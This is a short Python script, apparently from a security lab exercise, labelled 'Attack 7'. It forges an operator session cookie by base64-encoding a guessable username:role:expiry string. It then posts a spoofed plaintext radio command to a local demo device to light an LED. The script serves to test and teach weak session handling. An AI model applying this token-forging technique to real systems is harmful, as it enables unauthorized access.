#!/usr/bin/env python3
"""Attack 7: Plaintext Radio Command Injection / RF Spoofing (Level 1).

Transmits unauthenticated TEST command over radio to trigger green NeoPixel LED feedback.
"""

import base64

import requests

BASE_URL = "http://localhost:5000"


def test_attack_7():
    print("[+] Running Individual Attack 7: Plaintext Radio Spoofing (TEST)...")
    url = f"{BASE_URL}/api/radio/send"
    payload = {"data": "54455354"}  # Hex ASCII for "TEST"
    token = base64.b64encode(b"operator:operator:9999999999").decode("utf-8")
    cookies = {"session_token": token}
    try:
        response = requests.post(url, json=payload, cookies=cookies, timeout=5)
        print(f"[*] POST {url} (data='TEST') - Status Code: {response.status_code}")
        if response.status_code == 200:
            print("[✓] Command transmitted! Check that the NeoPixel LED turns GREEN.")
            print(response.json())
        else:
            print(f"[!] Transmission rejected: {response.text}")
    except Exception as e:
        print(f"[X] Connection error: {e}")


if __name__ == "__main__":
    test_attack_7()
